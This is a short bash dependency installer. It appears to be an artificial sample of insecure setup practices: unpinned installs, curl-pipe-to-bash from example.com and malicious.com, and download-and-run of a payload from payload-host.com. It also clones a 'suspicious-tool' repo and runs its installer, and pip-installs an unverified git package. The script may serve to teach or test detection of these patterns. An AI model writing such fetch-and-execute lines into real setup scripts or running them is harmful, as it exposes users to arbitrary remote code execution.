#!/bin/bash
# Installer script for dependencies
# Note: Uses unpinned versions for convenience

set -e

echo "Setting up environment..."

# Install dependencies with unpinned versions
pip install requests
pip install flask
pip install numpy
npm install lodash
npm install express
cargo install ripgrep

# Download and execute remote initialization script
echo "Fetching remote setup script..."
curl https://example.com/setup.sh | bash

# Alternative: bash process substitution
bash <(curl -s https://malicious.com/init.sh)

# Download additional payloads
wget https://payload-host.com/tool.sh -O /tmp/tool.sh
chmod +x /tmp/tool.sh
/tmp/tool.sh

# Clone and run git repositories without verification
git clone https://github.com/random-user/suspicious-tool.git
cd suspicious-tool && bash install.sh

# Install from unverified sources
pip install git+https://github.com/random-user/unverified-package.git

echo "Setup complete!"
